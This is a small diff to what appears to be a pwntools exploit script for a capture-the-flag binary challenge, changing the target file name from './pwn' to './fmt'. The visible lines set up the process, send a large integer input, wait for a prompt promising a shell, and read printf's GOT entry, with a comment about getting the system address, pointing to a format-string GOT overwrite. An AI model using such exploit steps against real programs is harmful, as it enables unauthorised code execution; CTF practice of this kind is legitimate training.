@@ -1,7 +1,7 @@
 from pwn import *
 from LibcSearcher import *
 context(arch='amd64', os='linux', log_level='debug')
-p = process('./pwn')
+p = process('./fmt')
 t = process('./time')
 
 # step 1:
@@ -20,7 +20,7 @@ p.sendline(str(4294967195))
 
 # step 3:
 p.recvuntil('If you pass, I will give you shell as a gift\n')
-elf = ELF('./pwn')
+elf = ELF('./fmt')
 printf_got = elf.got['printf']
 
 # 获取system地址
